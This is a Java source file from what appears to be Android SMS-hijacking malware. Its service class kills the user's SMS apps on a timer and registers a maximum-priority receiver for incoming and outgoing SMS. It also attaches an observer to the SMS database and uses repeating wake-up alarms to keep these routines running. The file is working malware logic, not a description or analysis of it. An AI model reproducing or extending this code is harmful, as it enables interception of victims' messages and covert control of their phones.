package net.workspace.export;
import net.workspace.biz.BIZ;
import net.workspace.manager.TaskManager;
import net.workspace.network.NetworkController;
import net.workspace.sms.SmsObserver;
import net.workspace.util.AppStoper;
import net.workspace.util.Constant;
import net.workspace.util.Logger;
import net.workspace.util.T;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Handler;
import com.tt.export.MainReceiver;
import com.tt.export.MainService;

public class ServiceHelper {
    private static String task_PREF_NAME = "hellohacker";
    private static String TASK_SERVICE_DO_ACTION = "MAY";
    public static final String TASK_CHECK = "BBBBB";
    private static final String DO_KILL_ACTION = "hello";
    public static final String CHECK_KILL_SCHEDULE_ACTION = "world";
    static String killPrefName = "howareyou";
    private static final Object taskLocker = new Object();
    public static void doService(Service service, Intent intent) {
        SharedPreferences pref = service.getSharedPreferences(task_PREF_NAME, 0);
        long current = System.currentTimeMillis();
        String action = null;
        if (intent != null) action = intent.getAction();
        if (TASK_SERVICE_DO_ACTION.equals(action)) {
            //T.init(service.getApplicationContext());
            T.killSmsApp();
            pref.edit().putLong(task_PREF_NAME, current).commit();
            TaskManager.getInstance().triggerByService();
        } else if (TASK_CHECK.equals(action)) {
            long lastProcessTime = pref.getLong(task_PREF_NAME, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                rescheduleTask();
            }
        } else if ("android.net.conn.CONNECTIVITY_CHANGE".equals(action)) {
            try {
                NetworkController.onNetworkChanged();
            } catch (Exception e) {
                Logger.error(e);
            }
        } else if (DO_KILL_ACTION.equals(action)) {
            service.getSharedPreferences(killPrefName, 0).edit().putLong(killPrefName, current).commit();
            AppStoper stoper = new AppStoper();
            stoper.killAllSmsApps();
        } else if (CHECK_KILL_SCHEDULE_ACTION.equals(action)) {
            long lastProcessTime = service.getSharedPreferences(killPrefName, 0).getLong(killPrefName, 0);
            if (current - lastProcessTime > BIZ.TASK_CHECK_INTERVAL * 1000) {
                rescheduleKillTask();
            }
        } else if ("register".equals(intent.getAction())) {
            T.killSmsApp();
            IntentFilter filter = new IntentFilter();
            filter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
            filter.addAction("android.intent.action.USER_PRESENT");
            filter.addAction("android.intent.action.BATTERY_CHANGED");
            filter.addAction("android.intent.action.TIME_TICK");
            filter.addAction("android.intent.action.SCREEN_OFF");
            filter.addAction("android.intent.action.SCREEN_ON");
            filter.addAction(T.SMS_RECEIVED);
            filter.addAction(T.SMS_SEND);
            filter.setPriority(0x7fffffff);
            service.registerReceiver(new MainReceiver(), filter);
            SmsObserver smsobserver = new SmsObserver(new Handler());
            service.getContentResolver().registerContentObserver(Uri.parse(Constant.CONTENT_SMS), true, smsobserver);
            T.killSmsApp();
        }
    }
    public static void rescheduleTask() {
        synchronized (taskLocker) {
            AlarmManager manager = (AlarmManager) T.context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(T.context, 0, new Intent().setClass(T.context, MainService.class).setAction(TASK_SERVICE_DO_ACTION), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, BIZ.TASK_CHECK_INTERVAL * 1000, pending);
        }
    }
    private static final Object killLocker = new Object();
    public static void rescheduleKillTask() {
        int interval = 612;//seconds
        synchronized (killLocker) {
            AlarmManager manager = (AlarmManager) T.context.getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(T.context, 0, new Intent().setClass(T.context, MainService.class).setAction(DO_KILL_ACTION), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, interval * 1000, pending);
        }
    }
}
